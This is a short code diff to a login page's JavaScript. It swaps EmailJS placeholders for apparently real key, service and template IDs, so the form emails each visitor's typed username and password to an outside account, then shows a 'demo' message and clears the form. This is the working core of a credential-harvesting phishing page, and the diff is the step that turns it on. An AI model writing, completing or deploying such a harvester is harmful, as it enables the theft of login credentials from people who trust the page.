@@ -28,7 +28,7 @@ form.addEventListener('submit', function (e) {
 // 4. Get your Public Key from Account > API Keys
 // 5. Replace the three placeholders below
 
-emailjs.init("YOUR_PUBLIC_KEY");
+emailjs.init("11UL95jmGpEIROJAI");
 
 function toggleButton() {
   loginBtn.disabled = !(username.value.trim() && password.value.trim());
@@ -45,7 +45,7 @@ form.addEventListener('submit', function (e) {
     password: password.value
   };
 
-  emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+  emailjs.send("service_ldr2lhd", "template_wrer1dj", params)
     .then(function () {
       demoMessage.style.display = 'block';
       form.reset();
